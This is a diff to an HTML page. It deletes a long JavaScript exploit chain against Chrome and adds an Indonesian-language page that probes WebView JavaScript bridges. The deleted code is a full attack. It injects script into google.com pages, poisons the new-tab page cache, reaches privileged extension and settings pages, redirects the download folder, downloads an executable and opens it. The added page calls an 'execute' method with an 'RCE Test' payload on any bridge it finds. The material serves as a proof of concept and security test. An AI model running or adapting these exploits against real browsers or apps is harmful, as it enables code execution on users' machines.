@@ -1,337 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bridge Security Tester</title>
+</head>
 <body>
-<script>
-(function () {
-uxssGoogleCom = function () {
-	var frame = document.body.appendChild(document.createElement("iframe"));
-	frame.src = "https://www.google.com/intl/en/ads/";
-	frame.onload = function () {
-		frame.onload = null;
+    <h1>Security Diagnostic Tool</h1>
+    <p>Status: <span id="status">Mendeteksi Bridge...</span></p>
+    <div id="output" style="border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></div>
 
-		var blob = new Blob(["<script>(" + function () {
-			alert("the frame inside google.com");
+    <script>
+        function log(message) {
+            const div = document.getElementById('output');
+            div.innerHTML += '<p>' + message + '</p>';
+        }
 
-			frame = document.documentElement.appendChild(document.createElement("iframe"));
-			frame.contentWindow.eval("parent.document.open()");
-			location = "javascript:'<script>top.googleComFunction = parent.Function;"
-				+ "top.findOutRegionalDomain()</sc" + "ript>'";
-		} + "())</sc" + "ript>"], {type: "text/html"});
-		frame.contentWindow.frames[0].location = URL.createObjectURL(blob);
-	}
-};
+        // Daftar nama bridge yang sering digunakan (contoh umum)
+        const bridges = ['AndroidBridge', 'WebViewBridge', 'JSInterface', '1inchBridge'];
 
-findOutRegionalDomain = function () {
-	googleComFunction("expLocation", "callback", "(" + function () {
-		alert("the script running inside google.com, location: " + location.href);
+        window.onload = function() {
+            let found = false;
+            bridges.forEach(name => {
+                if (window[name]) {
+                    log('Ditemukan: ' + name);
+                    found = true;
+                    
+                    // Mencoba memanggil method untuk tes eksekusi
+                    try {
+                        log('Mencoba eksekusi method...');
+                        // Contoh memanggil fungsi 'execute' jika ada
+                        window[name].execute('alert("RCE Test")'); 
+                    } catch (e) {
+                        log('Error saat eksekusi: ' + e.message);
+                    }
+                }
+            });
 
-		var xhr = new XMLHttpRequest;
-	    xhr.open("get", "https://www.google.com/webhp?gws_rd=cr");
-	    xhr.send();
-	   	xhr.onload = function () {
-	   		var regionalUrl = /prev=(.+?)(&|$)/.exec(xhr.response.substring(xhr.response.indexOf("setprefdomain")));
-	        if (!regionalUrl) {
-	        	regionalUrl = "https://www.google.com";
-	        } else {
-	        	regionalUrl = unescape(regionalUrl[1]);
-	        }
-	    	alert("regional url: " + regionalUrl);
-
-	    	var element = document.createElement("a");
-            element.href = regionalUrl;
-            var regionalBaseURL = element.origin;
-
-            var frame = document.body.appendChild(document.createElement("iframe"));
-			frame.src = regionalBaseURL + "/intl/en/ads/";
-			frame.onload = function () {
-				frame.onload = null;
-
-				callback(frame);
-			};
-	    }
-   	} + "())")(location.href, function (frame) {
-		var blob = new Blob(["<script>(" + function () {
-			alert("the frame inside the regional google page");
-
-			frame = document.documentElement.appendChild(document.createElement("iframe"));
-			frame.contentWindow.eval("parent.document.open()");
-			location = "javascript:'<script>top.regionalGoogleFunction = parent.Function;"
-				+ "top.injectIntoCache()</sc" + "ript>'";
-		} + "())</sc" + "ript>"], {type: "text/html"});
-		frame.contentWindow.frames[0].location = URL.createObjectURL(blob);
-   	});
- };
-
-injectIntoCache = function () {
-	regionalGoogleFunction("runFromNewTab", "(" + function () {
-		alert("the script running inside " + location.href);
-		caches.keys().then(function (keys) {
-			caches.open(keys[0]).then(function (cache) {
-				var newTabUrl = location.origin + "/_/chrome/newtab?espv=2&ie=UTF-8";
-				var newTabUrl2 = location.origin + "/_/chrome/newtab?espv=2&es_th=1&ie=UTF-8";
-				cache.match(newTabUrl).then(function (response) {
-					var processBlob = function () {
-						response.blob().then(function (blob) {
-							var newBlob = new Blob(["<script>(" + runFromNewTab + "())<\/script>"]),
-								genResponse = new Response(newBlob, { headers: response.headers });
-								genResponse.headers.delete("x-frame-options");
-							Promise.all([
-								cache.put(newTabUrl, genResponse.clone()),
-								cache.put(newTabUrl2, genResponse.clone())
-								]).then(function () {
-									cache.put(location.origin + "/_/chrome/fake",
-										new Response(new Blob(["<script>localStorage.restart=1</sc" + "ript>"]))).then(function () {
-											top.location = newTabUrl;
-										});
-							});
-						});
-					};
-					if (response) {
-						processBlob();
-					} else {
-						fetch(newTabUrl).then(function (newResp) {
-							response = newResp;
-							processBlob();
-						});
-					}
-				});
-			});
-		});
-	} + "())")(runFromNewTab);
-};
-
-runFromNewTab = function () {
-	if (!chrome.embeddedSearch) {
-		if (location.search == "?espv=2&ie=UTF-8") {
-			location.search = "?espv=2&es_th=1&ie=UTF-8";
-		} else {
-			alert("no new tab page bindings");
-		}
-
-		return;
-	}
-
-
-	alert("the script running inside the ntp");
-	localStorage.restart = 0;
-
-	chrome.embeddedSearch.newTabPage.navigateContentWindow("chrome://chrome-signin", 5);
-	ntpUrl = location.href;
-	fakeUrl = location.origin + "/_/chrome/fake";
-
-	createExtensionHistoryEntry = function () {
-		var frame = document.body.appendChild(document.createElement("iframe")),
-			extensionUrl = "chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik/main.html";
-		frame.src = extensionUrl;
-		frame.onload = function () {
-			frame.onload = null;
-
-			var blob = new Blob(["<script>(" + function () {
-				frame = document.documentElement.appendChild(document.createElement("iframe"));
-				frame.contentWindow.eval("parent.document.open()");
-				location = "javascript:''";
-			} + "())</sc" + "ript>"], {type: "text/html"});
-			frame.contentWindow.frames[0].location = URL.createObjectURL(blob);
-
-			setTimeout(function () {
-				requestFS = frame.contentWindow.frames[0].Object
-					.getOwnPropertyDescriptor(frame.contentWindow,"webkitRequestFileSystem").value;
-
-				requestFS.bind(frame.contentWindow, TEMPORARY, 10000, function (fs) {
-					fs.root.getFile("after_reload.html", {create: true}, function (file) {
-						file.createWriter(function (fileWriter) {
-							var blob = new Blob(
-								["<script>(" + runFromExtensionContext + "('" + extensionUrl + "', '" + fakeUrl + "'))</sc" + "ript>"],
-								{type: "text/html"}
-							);
-							fileWriter.truncate(0);
-							fileWriter.onwriteend = function() {
-							    if (fileWriter.length == 0) {
-							        fileWriter.write(blob);
-							    } else {
-							    	chrome.embeddedSearch.newTabPage.navigateContentWindow(file.toURL(), 5);
-
-							    	intervalId = setInterval(function() {
-										if (localStorage.restart != 1)
-											return;
-
-										clearInterval(intervalId);
-										caches.keys().then(function (keys) {
-											caches.open(keys[0]).then(function (cache) {
-												cache.delete(location.href).then(function () {
-													alert("deleted the cache entry");
-
-													chrome.embeddedSearch.newTabPage.navigateContentWindow("chrome://restart", 5);
-												});
-											});
-										});
-									}, 100);
-							    }
-							};
-						});
-					});
-				})();
-			}, 1000);
-		};
-	};
-
-	runFromExtensionContext = function (extensionUrl, ntpUrl) {
-		if (window == top) {
-			frame = document.createElement("iframe");
-			frame.name = "gaia-frame";
-			frame.src = location.href;
-
-			history.pushState("", "", extensionUrl);
-			document.write("<body/>");
-			document.body.appendChild(frame);
-			frame.onload = function () { 
-				frame.onload = null;
-
-				anotherFrame = document.body.appendChild(document.createElement("iframe"));
-				anotherFrame.src = ntpUrl + "#sendRestartCommandViaLocalStorage";
-			}
-		} else if (top.chrome.tabs) {
-			alert("running inside the privileged extension");
-
-			chrome.extension = {};
-
-            top.chrome.tabs.query({ url: "chrome://chrome-signin/*" }, function(tabs) {
-                signinTab = tabs[0];
-
-                top.chrome.windows.create(
-                    {
-                        focused: true
-                    }, function(newWindow) {
-                            top.chrome.tabs.getCurrent(function(currentTab) {
-                                top.chrome.tabs.move(currentTab.id, {windowId: newWindow.id, index: -1});
-                                top.chrome.tabs.move(signinTab.id, {windowId: newWindow.id, index: -1});
-
-                                downloadAndExec();
-                            });
-						}
-   				);
-            });   
-
-            downloadAndExec = function () {
-				top.chrome.tabs.create({url: "chrome://settings-frame"}, function (settingsTab) {
-					top.chrome.tabs.update(settingsTab.id, {url: "javascript:(" + function () {
-						alert("running inside the settings page");
-
-						chrome.send("setStringPref", [
-	                        "download.default_directory",
-	                        BrowserOptions.getCurrentProfile().filePath
-	                        + "\\Extensions\\ghmkgdjpadfalecomlhllfckggkcdppi\\1.2_0"
-	                        ]);
-						document.title = "step1";
-					} + "())"});
-					top.chrome.tabs.executeScript(settingsTab.id, {code: "(" + function () {
-						chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
-							intervalId = setInterval(function() {
-								if (document.title != message)
-									return;
-
-								clearInterval(intervalId);
-								sendResponse(message);
-							}, 100);
-							return true;
-						});
-					} + "())"}, function () {
-						top.chrome.tabs.sendMessage(settingsTab.id, "step1", function (message) {
-							top.alert("changed the default download dir");
-
-							top.chrome.tabs.create({url: "chrome://downloads"}, function (downloadsTab) {
-								top.chrome.tabs.update(downloadsTab.id, {url: "javascript:(" + function () {
-									alert("rinning inside the downloads page");
-									downloads.Manager.updateItem = function (data) {
-										if (data.file_name == "RunCalc.exe" && data.state == "COMPLETE") {
-											downloadId = data.id;
-											document.title = "step2";
-										}
-									};
-									downloads.Manager.updateAll = function(array) { array.length && downloads.Manager.updateItem(array[0]) };
-									chrome.send("getDownloads", [""]); 
-								} + "())"});
-
-								anchor = document.createElement("a");
-								anchor.href = "https://dl.google.com/tag/s/a/update2/installers/ChromeSetup.exe";
-								anchor.download = "RunCalc.exe";
-								anchor.click();
-
-								top.chrome.tabs.executeScript(downloadsTab.id, {code: "(" + function () {
-									chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
-										intervalId = setInterval(function() {
-											if (document.title != message)
-												return;
-
-											clearInterval(intervalId);
-											sendResponse(message);
-										}, 100);
-										return true;
-									});
-								} + "())"}, function () {
-									top.chrome.tabs.sendMessage(downloadsTab.id, "step2", function (message) {
-										top.alert("downloaded the safe .exe");
-
-										top.chrome.tabs.create({url: "https://chrome.google.com/webstore/category/apps"}, function (webstoreTab) {
-											installTheme = function (stepId) {
-												top.chrome.tabs.update(webstoreTab.id, {url: "javascript:(" + function (stepId) {
-													alert("rinning inside the extension gallery");
-
-													chrome.webstorePrivate.beginInstallWithManifest3({
-													    id: "ghmkgdjpadfalecomlhllfckggkcdppi",
-													    manifest: '{"version":"1","manifest_version":2,"name":"Empty theme with exe inside","theme":{}}'},
-													    function() {
-													            chrome.webstorePrivate.completeInstall("ghmkgdjpadfalecomlhllfckggkcdppi", function() {
-													            	document.title = stepId;
-													            });
-													    });
-												} + "('" + stepId + "'))"});
-											};
-											installTheme("step3");
-
-											top.chrome.tabs.executeScript(webstoreTab.id, {code: "(" + function () {
-												chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
-													intervalId = setInterval(function() {
-														if (document.title != message)
-															return;
-
-														clearInterval(intervalId);
-														sendResponse(message);
-													}, 100);
-													return true;
-												});
-											} + "())"}, function () {
-												top.chrome.tabs.sendMessage(webstoreTab.id, "step3", function (message) {
-													top.alert("installed the theme");
-
-													top.chrome.tabs.update(settingsTab.id, {url: "javascript:(" + function () {
-														chrome.send('themesReset');
-													} + "())"}, function () {
-														installTheme("step4");
-														top.chrome.tabs.sendMessage(webstoreTab.id, "step4", function (message) {
-															top.alert("installed the theme for the second time");
-
-															top.chrome.tabs.update(downloadsTab.id, {url: "javascript:(" + function () {
-																chrome.send("openFile", [downloadId]);
-															} + "())"});
-														});
-													});
-												});
-											});
-										});
-									});
-								});
-							});
-						});
-					});
-				});
-			};
-		}
-	}
-
-	setTimeout(createExtensionHistoryEntry, 0);
-};
-if (confirm("start?")) {
-	uxssGoogleCom();
-}
-}());
-</script>
+            if (!found) {
+                document.getElementById('status').innerText = 'Tidak ada Bridge yang terekspos.';
+            } else {
+                document.getElementById('status').innerText = 'Bridge ditemukan!';
+            }
+        };
+    </script>
 </body>
+</html>
